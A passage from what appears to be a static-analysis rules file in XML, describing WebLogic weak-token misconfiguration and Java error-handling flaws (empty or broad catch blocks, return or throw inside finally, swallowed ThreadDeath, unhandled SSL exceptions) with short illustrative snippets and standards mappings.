																									   <p>[14] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[20]  <em>Security Policy Assertion Reference</em> BEA<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_weblogic_misconfiguration_weak_token</key>
		<internalKey>Environment/Weblogic Misconfiguration/Weak Token
		</internalKey>
		<name>Weblogic Misconfiguration: Weak Token</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Using a <code>UsernameToken</code> with a plain text password over an unencrypted channel exposes the password to attackers who can sniff the SOAP messages.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Sending clear text passwords over an unencrypted channel can expose the credential to attackers who can sniff the SOAP message.<br><br><b>Example 1:</b> The following policy entry uses the <code>UsernameToken</code>.<br><pre><br>&lt;wssp:SupportedTokens&gt;<br>    &lt;wssp:SecurityToken TokenType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#UsernameToken" /&gt;<br>&lt;/wssp:SupportedTokens&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 254</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[21]  <em>Security Policy Assertion Reference</em> BEA<br></p>
																									   <p>[22]  <em>Web Services Security Username Token Profile 1.0</em> OASIS<br></p>
																									   <p>[23]  <em>Web Services Security: SOAP Message Security 1.1</em> OASIS<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>errors_poor_error_handling_empty_catch_block</key>
		<internalKey>Errors/Poor Error Handling/Empty Catch Block
		</internalKey>
		<name>Poor Error Handling: Empty Catch Block</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Ignoring an exception can cause the program to overlook unexpected states and conditions.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Just about every serious attack on a software system begins with the violation of a programmer's assumptions. After the attack, the programmer's assumptions seem flimsy and poorly founded, but before an attack many programmers would defend their assumptions well past the end of their lunch break.<br><br>Two dubious assumptions that are easy to spot in code are "this method call can never fail" and "it doesn't matter if this call fails". When a programmer ignores an exception, they implicitly state that they are operating under one of these assumptions.<br><br><b>Example 1:</b> The following code excerpt ignores a rarely-thrown exception from <code>doExchange()</code>.<br><br><pre><br>try {<br>  doExchange();<br>}<br>catch (RareException e) {<br>  // this can never happen<br>}<br></pre><br><br>If a <code>RareException</code> were to ever be thrown, the program would continue to execute as though nothing unusual had occurred. The program records no evidence indicating the special situation, potentially frustrating any later attempt to explain the program's behavior.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A7 Improper Error Handling</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3120 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3120 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3120 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3120 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3120 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>AU</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 391</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.2, Requirement 6.5.6</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>errors</tag>
	</rule>
	<rule>
		<key>errors_poor_error_handling_overly_broad_catch</key>
		<internalKey>Errors/Poor Error Handling/Overly Broad Catch
		</internalKey>
		<name>Poor Error Handling: Overly Broad Catch</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The catch block handles a broad swath of exceptions, potentially trapping dissimilar issues or problems that should not be dealt with at this point in the program.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Multiple catch blocks can get ugly and repetitive, but "condensing" catch blocks by catching a high-level class like <code>Exception</code> can obscure exceptions that deserve special treatment or that should not be caught at this point in the program. Catching an overly broad exception essentially defeats the purpose of Java's typed exceptions, and can become particularly dangerous if the program grows and begins to throw new types of exceptions. The new exception types will not receive any attention.<br><br><b>Example:</b> The following code excerpt handles three types of exceptions in an identical fashion.<br><br><pre><br>  try {<br>    doExchange();<br>  }<br>  catch (IOException e) {<br>    logger.error("doExchange failed", e);<br>  }<br>  catch (InvocationTargetException e) {<br>    logger.error("doExchange failed", e);<br>  }<br>  catch (SQLException e) {<br>    logger.error("doExchange failed", e);<br>  }<br></pre><br><br>At first blush, it may seem preferable to deal with these exceptions in a single catch block, as follows:<br><br><pre><br>  try {<br>    doExchange();<br>  }<br>  catch (Exception e) {<br>    logger.error("doExchange failed", e);<br>  }<br></pre><br><br>However, if <code>doExchange()</code> is modified to throw a new type of exception that should be handled in some different kind of way, the broad catch block will prevent the compiler from pointing out the situation. Further, the new catch block will now also handle exceptions derived from <code>RuntimeException</code> such as <code>ClassCastException</code>, and <code>NullPointerException</code>, which is not the programmer's intent.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A7 Improper Error Handling</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3120 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3120 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3120 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3120 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3120 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>AU</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 396</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.2, Requirement 6.5.6</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>errors</tag>
	</rule>
	<rule>
		<key>errors_poor_error_handling_overly_broad_throws</key>
		<internalKey>Errors/Poor Error Handling/Overly Broad Throws
		</internalKey>
		<name>Poor Error Handling: Overly Broad Throws</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The method throws a generic exception making it harder for callers to do a good job of error handling and recovery.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Declaring a method to throw <code>Exception</code> or <code>Throwable</code> makes it difficult for callers to do good error handling and error recovery. Java's exception mechanism is set up to make it easy for callers to anticipate what can go wrong and write code to handle each specific exceptional circumstance. Declaring that a method throws a generic form of exception defeats this system.<br><br><b>Example:</b> The following method throws three types of exceptions.<br><br><pre><br>public void doExchange()<br>  throws IOException, InvocationTargetException,<br>         SQLException {<br>  ...<br>}<br><br></pre><br><br>While it might seem tidier to write<br><br><pre><br>public void doExchange()<br>  throws Exception {<br>  ...<br>}<br></pre><br><br>doing so hampers the caller's ability to understand and handle the exceptions that occur. Further, if a later revision of <code>doExchange()</code> introduces a new type of exception that should be treated differently than previous exceptions, there is no easy way to enforce this requirement.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A7 Improper Error Handling</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3120 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3120 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3120 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3120 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3120 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>AU</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 397</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.2, Requirement 6.5.6</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>errors</tag>
	</rule>
	<rule>
		<key>errors_poor_error_handling_program_catches_nullpointerexception
		</key>
		<internalKey>Errors/Poor Error Handling/Program Catches
			NullPointerException
		</internalKey>
		<name>Poor Error Handling: Program Catches NullPointerException</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  It is generally a bad practice to catch <code>NullPointerException</code>.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Programmers typically catch <code>NullPointerException</code> under three circumstances:<br><br>1. The program contains a null pointer dereference. Catching the resulting exception was easier than fixing the underlying problem.<br><br>2. The program explicitly throws a <code>NullPointerException</code> to signal an error condition.<br><br>3. The code is part of a test harness that supplies unexpected input to the classes under test.<br><br>Of these three circumstances, only the last is acceptable.<br><br><b>Example:</b> The following code mistakenly catches a <code>NullPointerException</code>.<br><br><pre><br>  try {<br>    mysteryMethod();<br>  }<br>  catch (NullPointerException npe) {<br>  }<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A7 Improper Error Handling</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3120 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3120 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3120 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3120 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3120 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 395</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.2, Requirement 6.5.6</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[13] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>errors</tag>
	</rule>
	<rule>
		<key>errors_poor_error_handling_return_inside_finally</key>
		<internalKey>Errors/Poor Error Handling/Return Inside Finally
		</internalKey>
		<name>Poor Error Handling: Return Inside Finally</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Returning from inside a <code>finally</code> block will cause exceptions to be lost.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A return statement inside a <code>finally</code> block will cause any exception that might be thrown in the try block to be discarded.<br><br><b>Example 1:</b> In the following code excerpt, the <code>MagicException</code> thrown by the second call to <code>doMagic</code> with <code>true</code> passed to it will never be delivered to the caller. The return statement inside the <code>finally</code> block will cause the exception to be discarded.<br><br><pre><br>public class MagicTrick {<br><br>public static class MagicException extends Exception { }<br><br>public static void main(String[] args) {<br><br>  System.out.println("Watch as this magical code makes an " +<br>                     "exception disappear before your very eyes!");<br><br>  System.out.println("First, the kind of exception handling " +<br>                     "you're used to:");<br>  try {<br>    doMagic(false);<br>  } catch (MagicException e) {<br>    // An exception will be caught here<br>    e.printStackTrace();<br>  }<br><br>  System.out.println("Now, the magic:");<br>  try {<br>    doMagic(true);<br>  } catch (MagicException e) {<br>    // No exception caught here, the finally block ate it<br>    e.printStackTrace();<br>  }<br>  System.out.println("tada!");<br>}<br><br>public static void doMagic(boolean returnFromFinally)<br>throws MagicException {<br><br>  try {<br>    throw new MagicException();<br>  }<br>  finally {<br>    if (returnFromFinally) {<br>      return;<br>    }<br>  }<br>}<br><br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A7 Improper Error Handling</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3120 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3120 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3120 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3120 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3120 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>AU</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 584</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.2, Requirement 6.5.6</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>errors</tag>
	</rule>
	<rule>
		<key>errors_poor_error_handling_swallowed_threaddeath</key>
		<internalKey>Errors/Poor Error Handling/Swallowed ThreadDeath
		</internalKey>
		<name>Poor Error Handling: Swallowed ThreadDeath</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  If a <code>ThreadDeath</code> error is not re-thrown, the thread in question might not actually die.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  <code>ThreadDeath</code> errors should only be caught if an applications needs to clean up after being terminated asynchronously. If a <code>ThreadDeath</code> error is caught, it is important that it be re-thrown so that the thread actually dies. The purpose of throwing <code>ThreadDeath</code> is to stop a thread. If <code>ThreadDeath</code> is swallowed, it can prevent a thread from stopping and result in unexpected behavior since whoever originally threw <code>ThreadDeath</code> expects the thread to stop.<br><br><b>Example 1:</b> The following code catches <code>ThreadDeath</code> but does not re-throw it.<br><pre><br>try<br>{<br>//some code<br>}<br>catch(ThreadDeath td)<br>{<br>//clean up code<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 691</em> <br></p>
																									   <p>[2] Sun Microsystems, Inc. <em>Java Sun Tutorial</em> <br></p>
																									   <p>[3] Scott Oaks, Henry Wong <em>Java Threads</em> O'Reilly<br></p>
																									   <p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>errors</tag>
	</rule>
	<rule>
		<key>errors_poor_error_handling_throw_inside_finally</key>
		<internalKey>Errors/Poor Error Handling/Throw Inside Finally
		</internalKey>
		<name>Poor Error Handling: Throw Inside Finally</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Using a <code>throw</code> statement inside a <code>finally</code> block breaks the logical progression through the <code>try-catch-finally</code>.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  In Java, <code>finally</code> blocks are always executed after their corresponding <code>try-catch</code> blocks and are often used to free allocated resources, such as file handles or database cursors. Throwing an exception in a <code>finally</code> block can bypass critical cleanup code since normal program execution will be disrupted.<br><br><b>Example 1:</b> In the following code, the call to <code>stmt.close()</code> is bypassed when the <code>FileNotFoundException</code> is thrown.<br><pre><br>public void processTransaction(Connection conn) throws FileNotFoundException<br>{<br>FileInputStream fis = null;<br>Statement stmt = null;<br>try<br>{<br>    stmt = conn.createStatement();<br>    fis = new FileInputStream("badFile.txt");<br>    ...<br>}<br>catch (FileNotFoundException fe)<br>{<br>    log("File not found.");<br>}<br>catch (SQLException se)<br>{<br>    //handle error<br>}<br>finally<br>{<br>    if (fis == null)<br>    {<br>        throw new FileNotFoundException();<br>    }<br><br>    if (stmt != null)<br>    {<br>        try<br>        {<br>            stmt.close();<br>        }<br>        catch (SQLException e)<br>        {<br>            log(e);<br>        }<br>    }<br>}<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A7 Improper Error Handling</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3120 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3120 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3120 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3120 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3120 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>AU</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 398</em> <br></p>
																									   <p>[10] Sun Microsystems, Inc. <em>Java Sun Tutorial</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.2, Requirement 6.5.6</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[15] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>errors</tag>
	</rule>
	<rule>
		<key>errors_poor_error_handling_unhandled_ssl_exception</key>
		<internalKey>Errors/Poor Error Handling/Unhandled SSL Exception
		</internalKey>
		<name>Poor Error Handling: Unhandled SSL Exception</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Failing to explicitly handle SSL exceptions can cause the application to overlook unexpected states and conditions.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Unhandled SSL exception vulnerabilities occur when:<br><br>1.	An SSL-specific exception is thrown.<br><br>2.	The exception is not explicitly handled.<br><br>The SSL-specific exceptions <code>javax.net.ssl.SSLHandshakeException</code>, <code>javax.net.ssl.SSLKeyException</code>, and <code>javax.net.ssl.SSLPeerUnverifiedException</code> all convey important errors related to an SSL connection. If these errors are not explicitly handled, the connection can be left in an unexpected and potential insecure state.<br><br>Just about every serious attack on a software system begins with the violation of a programmer's assumptions. After the attack, the programmer's assumptions seem flimsy and poorly founded, but before an attack many programmers would defend their assumptions well past the end of their lunch break.<br><br>Two dubious assumptions that are easy to spot in code are "this operation can never fail" and "it doesn't matter if this operation fails". When a programmer fails to catch an exception that an operation may throw, they implicitly state that they are operating under one of these assumptions.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A7 Improper Error Handling</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3120 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3120 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3120 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3120 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3120 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>AU</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 388</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.2, Requirement 6.5.6</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[15] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>errors</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_adf_bad_practices_missing_url_parameter_converter
		</key>
		<internalKey>Input Validation and Representation/ADF Bad
